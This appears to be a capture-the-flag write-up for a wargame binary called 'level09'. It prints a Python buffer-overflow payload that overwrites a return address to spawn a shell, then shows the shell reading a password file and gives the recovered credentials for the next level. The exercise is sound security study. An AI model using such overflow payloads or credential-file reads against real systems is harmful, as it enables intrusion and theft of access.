# Level09

> For introductory information on this operating system and binary securities, check [here](./analysis.md).

Using [`gdb`](https://linux.die.net/man/1/gdb), we can dig through the binary to understand what's going on (full analysis [here](./gdb.md)).

```shell
  $> (python -c "print '\x90' * 40 + '\xff\n' + '\x90' * 200 + '\x00\x00\x55\x55\x55\x55\x48\x8c'[::-1] + '\n/bin/sh'"; cat) | ./level09 
  --------------------------------------------
  |   ~Welcome to l33t-m$n ~    v1337        |
  --------------------------------------------
  >: Enter your username
  >>: >: Welcome, �����������������������������������������>: Msg @Unix-Dude
  >>: >: Msg sent!
  cat /home/users/end/.pass
  j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```

So next user credentials pair is `end:j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE`.

Check [here](../source.c) for reproduction source-code of this binary.